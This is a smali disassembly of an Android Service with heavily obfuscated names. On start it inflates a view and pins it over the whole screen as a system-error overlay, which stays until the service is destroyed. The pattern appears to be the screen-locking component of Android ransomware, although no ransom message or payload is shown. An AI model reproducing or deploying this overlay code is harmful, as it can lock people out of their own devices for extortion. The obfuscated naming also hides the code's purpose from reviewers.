.class public Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/pevuphdgxzoxibrophsewnqmdrgcaryazkoqztyduxjsjmqlmseatijywntkclnvbiwfcluhbkfvgf;
.super Landroid/app/Service;


# static fields
.field public static a:Z


# instance fields
.field private a:Landroid/view/View;

.field private a:Landroid/view/WindowManager;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    sput-boolean v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/pevuphdgxzoxibrophsewnqmdrgcaryazkoqztyduxjsjmqlmseatijywntkclnvbiwfcluhbkfvgf;->a:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 6

    const/4 v1, -0x1

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    sget-boolean v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/pevuphdgxzoxibrophsewnqmdrgcaryazkoqztyduxjsjmqlmseatijywntkclnvbiwfcluhbkfvgf;->a:Z

    if-nez v0, :cond_0

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/pevuphdgxzoxibrophsewnqmdrgcaryazkoqztyduxjsjmqlmseatijywntkclnvbiwfcluhbkfvgf;->stopSelf()V

    :cond_0
    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    const/16 v3, 0x7da

    const v4, 0x48100

    const/4 v5, -0x3

    move v2, v1

    invoke-direct/range {v0 .. v5}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    const-string v1, "window"

    invoke-virtual {p0, v1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/pevuphdgxzoxibrophsewnqmdrgcaryazkoqztyduxjsjmqlmseatijywntkclnvbiwfcluhbkfvgf;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/WindowManager;

    iput-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/pevuphdgxzoxibrophsewnqmdrgcaryazkoqztyduxjsjmqlmseatijywntkclnvbiwfcluhbkfvgf;->a:Landroid/view/WindowManager;

    const-string v1, "layout_inflater"

    invoke-virtual {p0, v1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/pevuphdgxzoxibrophsewnqmdrgcaryazkoqztyduxjsjmqlmseatijywntkclnvbiwfcluhbkfvgf;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/LayoutInflater;

    const v2, 0x7f040003

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v1

    iput-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/pevuphdgxzoxibrophsewnqmdrgcaryazkoqztyduxjsjmqlmseatijywntkclnvbiwfcluhbkfvgf;->a:Landroid/view/View;

    iget-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/pevuphdgxzoxibrophsewnqmdrgcaryazkoqztyduxjsjmqlmseatijywntkclnvbiwfcluhbkfvgf;->a:Landroid/view/WindowManager;

    iget-object v2, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/pevuphdgxzoxibrophsewnqmdrgcaryazkoqztyduxjsjmqlmseatijywntkclnvbiwfcluhbkfvgf;->a:Landroid/view/View;

    invoke-interface {v1, v2, v0}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    return-void
.end method

.method public onDestroy()V
    .locals 2

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    const/4 v0, 0x0

    sput-boolean v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/pevuphdgxzoxibrophsewnqmdrgcaryazkoqztyduxjsjmqlmseatijywntkclnvbiwfcluhbkfvgf;->a:Z

    :try_start_0
    iget-object v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/pevuphdgxzoxibrophsewnqmdrgcaryazkoqztyduxjsjmqlmseatijywntkclnvbiwfcluhbkfvgf;->a:Landroid/view/WindowManager;

    iget-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/pevuphdgxzoxibrophsewnqmdrgcaryazkoqztyduxjsjmqlmseatijywntkclnvbiwfcluhbkfvgf;->a:Landroid/view/View;

    invoke-interface {v0, v1}, Landroid/view/WindowManager;->removeViewImmediate(Landroid/view/View;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method
